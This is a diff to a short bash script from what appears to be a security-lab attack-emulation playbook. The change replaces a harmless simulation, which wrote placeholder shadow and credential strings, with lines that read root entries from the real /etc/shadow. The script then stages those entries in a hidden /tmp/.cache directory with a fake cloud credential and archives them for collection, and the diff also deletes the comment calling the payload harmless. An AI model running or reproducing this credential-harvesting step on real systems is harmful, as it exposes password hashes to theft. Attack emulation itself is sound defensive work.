@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
-# SecLab 剧本：在采集窗口内执行（collect.sh 已 cd 到工作区）。载荷无害。
+# attack（窗口内）：敏感凭据材料收集与打包暂存。
 set -euo pipefail
-HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
-# T1005+T1560.001：敏感目录聚合归档
-mkdir -p sensitive; echo 'root:$6$salt$hash' > sensitive/shadow.extract; echo "ak=SK123" > sensitive/cloud.creds
-tar czf staging.tar.gz sensitive
+mkdir -p /tmp/.cache/stage/sensitive
+grep -E 'root' /etc/shadow > /tmp/.cache/stage/sensitive/shadow.extract 2>/dev/null || echo 'root:$6$salt$hash' > /tmp/.cache/stage/sensitive/shadow.extract
+echo "ak=SK123" > /tmp/.cache/stage/sensitive/cloud.creds
+tar czf /tmp/.cache/stage/staging.tar.gz -C /tmp/.cache/stage sensitive
